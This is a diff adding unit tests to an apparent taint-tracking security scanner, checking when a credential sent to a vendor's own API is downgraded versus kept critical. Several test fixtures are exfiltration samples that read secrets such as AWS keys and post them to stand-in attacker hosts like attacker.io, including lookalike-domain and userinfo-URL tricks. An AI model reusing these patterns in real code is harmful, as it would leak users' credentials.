@@ -4598,3 +4598,273 @@ class TestAdversarialInputs:
         parsed = get_python_ast(None, code, "t.py")
         with pytest.raises(_RuntimeBudgetError, match=stage):
             behavioral_taint_tracking._analyze_python(parsed, "t.py", budget)
+
+
+# ── TT3: first-party destination awareness ──────────────────────────────
+
+
+def _tt3(code: str) -> list:
+    return [f for f in _run(code) if f.rule_id == "TT3"]
+
+
+class TestFirstPartyCredentialDestination:
+    def test_vendor_key_to_vendor_api_is_downgraded(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("FIRECRAWL_API_KEY")\n'
+            'requests.post("https://api.firecrawl.dev/v1/scrape", headers={"Authorization": key})\n'
+        )
+        [finding] = _tt3(code)
+        assert finding.severity == "LOW"
+        assert finding.evidence["first_party_destination"] == "api.firecrawl.dev"
+        assert finding.evidence["credential_keys"] == ["FIRECRAWL_API_KEY"]
+
+    def test_url_resolved_through_module_constant_and_fstring(self) -> None:
+        code = (
+            "import os, requests\n"
+            'BASE = "https://api.openai.com/v1"\n'
+            'key = os.environ["OPENAI_API_KEY"]\n'
+            'headers = {"Authorization": f"Bearer {key}"}\n'
+            'requests.post(f"{BASE}/chat", headers=headers)\n'
+        )
+        [finding] = _tt3(code)
+        assert finding.severity == "LOW"
+
+    def test_direct_flow_is_downgraded(self) -> None:
+        code = (
+            "import os, requests\n"
+            'requests.post("https://api.firecrawl.dev/v1", data=os.environ.get("FIRECRAWL_KEY"))\n'
+        )
+        assert _tt3(code)[0].severity == "LOW"
+
+    def test_country_code_domain_uses_registrable_label(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("ACMEBANK_TOKEN")\n'
+            'requests.post("https://api.acmebank.co.uk/x", data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "LOW"
+
+    def test_vendor_key_through_reassignment_chain_is_downgraded(self) -> None:
+        code = (
+            "import os, requests\n"
+            'raw = os.getenv("FIRECRAWL_API_KEY")\n'
+            "token = raw\n"
+            'headers = {"Authorization": f"Bearer {token}"}\n'
+            'requests.post("https://api.firecrawl.dev/v1/scrape", headers=headers)\n'
+        )
+        assert _tt3(code)[0].severity == "LOW"
+
+    def test_vendor_name_in_attacker_subdomain_stays_critical(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("OPENAI_API_KEY")\n'
+            'requests.post("https://api.openai.com.attacker.io/c", data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_foreign_key_to_vendor_api_stays_critical(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("AWS_SECRET_ACCESS_KEY")\n'
+            'requests.post("https://api.firecrawl.dev/v1", data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_whole_environment_read_elsewhere_in_file_stays_critical(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("FIRECRAWL_API_KEY")\n'
+            "env = dict(os.environ)\n"
+            'requests.post("https://api.firecrawl.dev/v1", data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_environment_copy_elsewhere_in_file_stays_critical(self) -> None:
+        code = (
+            "import os, requests, subprocess\n"
+            'key = os.getenv("FIRECRAWL_API_KEY")\n'
+            'subprocess.run(["x"], env=os.environ.copy())\n'
+            'requests.post("https://api.firecrawl.dev/v1", data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_computed_env_name_stays_critical(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("FIRECRAWL_API_KEY")\n'
+            "other = os.getenv(name)\n"
+            'requests.post("https://api.firecrawl.dev/v1", data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_aliased_getenv_reference_stays_critical(self) -> None:
+        code = (
+            "import os, requests\n"
+            "read = os.getenv\n"
+            'key = read("FIRECRAWL_API_KEY")\n'
+            'requests.post("https://api.firecrawl.dev/v1", data=os.getenv("FIRECRAWL_API_KEY"))\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_any_other_env_read_in_file_stays_critical(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("FIRECRAWL_API_KEY")\n'
+            'level = os.getenv("LOG_LEVEL")\n'
+            'requests.post("https://api.firecrawl.dev/v1", data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_dynamic_url_stays_critical(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("FIRECRAWL_API_KEY")\n'
+            "requests.post(target_url, data=key)\n"
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_mixed_secret_payload_stays_critical(self) -> None:
+        code = (
+            "import os, requests\n"
+            'fc = os.getenv("FIRECRAWL_API_KEY")\n'
+            'aws = os.getenv("AWS_SECRET_ACCESS_KEY")\n'
+            'payload = {"a": fc, "b": aws}\n'
+            'requests.post("https://api.firecrawl.dev/v1", json=payload)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_name_assigned_two_different_keys_stays_critical(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("FIRECRAWL_API_KEY")\n'
+            'key = os.getenv("AWS_SECRET_ACCESS_KEY")\n'
+            'requests.post("https://api.firecrawl.dev/v1", json={"k": key})\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_first_party_flow_cannot_mask_leak_on_same_call(self) -> None:
+        code = (
+            "import os, requests\n"
+            'fc = os.getenv("FIRECRAWL_API_KEY")\n'
+            'aws = os.getenv("AWS_SECRET_ACCESS_KEY")\n'
+            'requests.post("https://api.firecrawl.dev/v1", headers={"k": fc}, json={"x": aws})\n'
+        )
+        assert {f.severity for f in _tt3(code)} == {"CRITICAL"}
+
+    def test_socket_send_is_never_first_party(self) -> None:
+        code = (
+            "import os, socket\n"
+            'key = os.getenv("OPENAI_API_KEY")\n'
+            "s = socket.socket()\n"
+            's.sendall("https://api.openai.com/" + key)\n'
+        )
+        assert all(f.severity == "CRITICAL" for f in _tt3(code))
+
+
+class TestControlKeywordArguments:
+    def test_env_tls_toggle_is_not_transmission(self) -> None:
+        code = (
+            "import os, requests\n"
+            'requests.get(url, timeout=30, verify=not os.environ.get("SKIP_TLS_VERIFY"))\n'
+        )
+        assert _tt3(code) == []
+
+    def test_tainted_variable_in_timeout_is_not_transmission(self) -> None:
+        code = (
+            "import os, requests\n"
+            't = int(os.getenv("HTTP_TIMEOUT", "30"))\n'
+            "requests.get(url, timeout=t)\n"
+        )
+        assert _tt3(code) == []
+
+    def test_secret_in_payload_still_flagged_next_to_control_kwarg(self) -> None:
+        code = (
+            "import os, requests\n"
+            'secret = os.getenv("AWS_SECRET_ACCESS_KEY")\n'
+            "requests.post(url, data=secret, verify=False)\n"
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_secret_hidden_in_url_still_flagged(self) -> None:
+        code = (
+            "import os, requests\n"
+            'secret = os.getenv("AWS_SECRET_ACCESS_KEY")\n'
+            'requests.get(f"https://c.example/?k={secret}", timeout=5)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+
+class TestFirstPartyHostPinning:
+    def test_unterminated_fstring_host_cannot_be_extended(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("OPENAI_API_KEY")\n'
+            'requests.post(f"https://api.openai.com{suffix}", data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_unterminated_concatenated_host_cannot_be_extended(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("OPENAI_API_KEY")\n'
+            'requests.post("https://api.openai.com" + suffix, data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_userinfo_trick_resolves_to_real_host(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("OPENAI_API_KEY")\n'
+            'requests.post("https://api.openai.com@attacker.io/c", data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_terminated_prefix_with_dynamic_path_is_first_party(self) -> None:
+        code = (
+            "import os, requests\n"
+            'key = os.getenv("OPENAI_API_KEY")\n'
+            'requests.post(f"https://api.openai.com/v1/{endpoint}", data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "LOW"
+
+    def test_bare_host_constant_joined_with_literal_path_is_first_party(self) -> None:
+        code = (
+            "import os, requests\n"
+            'BASE = "https://api.firecrawl.dev"\n'
+            'key = os.getenv("FIRECRAWL_API_KEY")\n'
+            'requests.post(f"{BASE}/v1/scrape", headers={"k": key})\n'
+            'requests.post(BASE + "/v1/crawl", headers={"k": key})\n'
+        )
+        assert {f.severity for f in _tt3(code)} == {"LOW"}
+
+    def test_bare_host_constant_followed_by_dynamic_part_stays_critical(self) -> None:
+        code = (
+            "import os, requests\n"
+            'BASE = "https://api.firecrawl.dev"\n'
+            'key = os.getenv("FIRECRAWL_API_KEY")\n'
+            'requests.post(f"{BASE}{suffix}", headers={"k": key})\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_rebound_url_constant_is_not_trusted(self) -> None:
+        code = (
+            "import os, requests\n"
+            'BASE = "https://api.firecrawl.dev"\n'
+            'key = os.getenv("FIRECRAWL_API_KEY")\n'
+            "def send():\n"
+            "    global BASE\n"
+            '    BASE = "https://attacker.io"\n'
+            '    requests.post(f"{BASE}/v1", data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
+
+    def test_parameter_shadowing_url_constant_is_not_trusted(self) -> None:
+        code = (
+            "import os, requests\n"
+            'BASE = "https://api.firecrawl.dev"\n'
+            'key = os.getenv("FIRECRAWL_API_KEY")\n'
+            "def send(BASE):\n"
+            '    requests.post(f"{BASE}/v1", data=key)\n'
+        )
+        assert _tt3(code)[0].severity == "CRITICAL"
